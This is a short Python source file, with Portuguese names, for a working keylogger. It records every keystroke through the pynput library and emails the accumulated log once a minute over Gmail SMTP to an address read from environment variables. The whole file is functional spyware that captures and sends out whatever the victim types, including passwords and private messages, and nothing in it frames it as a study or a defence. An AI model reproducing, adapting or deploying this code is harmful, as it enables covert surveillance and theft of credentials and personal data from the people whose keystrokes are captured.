from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer
import os

EMAIL_ORIGEM = os.getenv('KEYLOGGER_EMAIL')
EMAIL_DESTINO = os.getenv('KEYLOGGER_EMAIL_DESTINO')
SENHA_EMAIL = os.getenv('KEYLOGGER_EMAIL_PASSWORD')

log = ""

def enviarEmail():
    global log  
    if log:
        msg = MIMEText(log)
        msg['Subject'] = "Dados capturados pelo KeyLogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)

        log = ""
    Timer(60, enviarEmail).start()

def onPress(key):
    global log
    try:
        log+= key.char    
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<]"
            pass
        else:
            pass

try:
    with keyboard.Listener(on_press=onPress) as listener:
        enviarEmail()
        listener.join()
except Exception as e:
    print(f"Erro inesperado: {e}")